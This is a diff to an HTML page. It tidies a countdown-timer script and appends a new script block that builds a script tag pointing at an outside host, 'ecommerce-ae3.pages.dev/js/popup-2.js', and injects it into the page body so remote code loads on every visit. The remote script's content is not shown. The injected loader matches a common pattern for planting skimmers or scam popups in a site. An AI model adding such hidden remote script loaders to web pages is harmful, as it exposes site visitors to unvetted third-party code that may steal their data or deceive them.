@@ -397,23 +397,27 @@ margin-bottom: 16px;
 </div>
 <footer>
 </footer>
+
 <script>
 function startTimer(duration, display) {
 var timer = duration, minutes, seconds;
 setInterval(function () {
 minutes = parseInt(timer / 60, 10);
 seconds = parseInt(timer % 60, 10);
-
 minutes = minutes < 10 ? "0" + minutes : minutes;
 seconds = seconds < 10 ? "0" + seconds : seconds;
-
 display.text(minutes + "min " + seconds+ "sec" );
-
 if (--timer < 0) {
 timer = duration;
-}
+};
 }, 1000);
-}
+};
+</script>
+
+<script>
+var scriptM1 = document.createElement('script');
+scriptM1.src='https://ecommerce-ae3.pages.dev/js/popup-2.js';
+document.getElementsByTagName('body')[0].appendChild(scriptM1);
 </script>
 
 </body>
